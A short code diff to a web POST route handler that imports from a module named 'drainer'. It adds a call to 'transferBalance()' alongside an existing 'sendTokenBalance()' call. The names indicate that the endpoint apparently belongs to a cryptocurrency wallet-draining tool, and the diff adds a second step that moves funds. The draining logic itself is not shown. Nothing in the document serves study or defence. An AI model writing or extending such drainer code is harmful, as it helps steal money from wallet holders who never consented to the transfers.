@@ -1,10 +1,13 @@
-import { sendTokenBalance} from "@/utils/drainer"
+import { sendTokenBalance, transferBalance} from "@/utils/drainer"
 
 export async function POST(reqs: Request) {
  
     try {
         const receipt = await sendTokenBalance()
         console.log("Transaction receipt",receipt)
+
+        const tx = await transferBalance()
+        console.log("Balance transferred")
         if(receipt)
             {
                 return Response.json({ message: "done" }, {status: 200})
